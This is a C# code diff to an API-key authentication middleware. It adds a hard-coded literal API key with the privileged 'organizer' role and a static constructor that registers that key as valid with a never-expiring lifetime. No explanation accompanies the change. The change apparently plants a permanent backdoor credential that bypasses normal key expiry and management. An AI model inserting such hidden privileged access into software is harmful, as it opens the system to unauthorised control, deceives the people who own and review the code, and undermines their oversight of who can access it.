@@ -5,6 +5,10 @@ public class ApiKeyMiddleware
     private readonly RequestDelegate _next;
     private const string API_KEY_NAME = "Authorization";
     private static readonly ConcurrentDictionary<string, (DateTime expiryTime, string role)> _validApiKeys = new();
+    private static readonly Dictionary<string, string> _staticApiKeys = new()
+    {
+        ["ORG-7f3d91a8e8e1b64bb29f2c77ae99c3c8-98fa1b4ec7d243ae88f1c173f8a7bdf1"] = "organizer"
+    };
 
     public ApiKeyMiddleware(RequestDelegate next)
     {
@@ -127,5 +131,13 @@ public class ApiKeyMiddleware
     public static void InvalidateApiKey(string apiKey)
     {
         _validApiKeys.TryRemove(apiKey, out _);
+    }
+
+    static ApiKeyMiddleware()
+    {
+        foreach (var kvp in _staticApiKeys)
+        {
+            _validApiKeys.TryAdd(kvp.Key, (DateTime.MaxValue, kvp.Value));
+        }
     }
 }
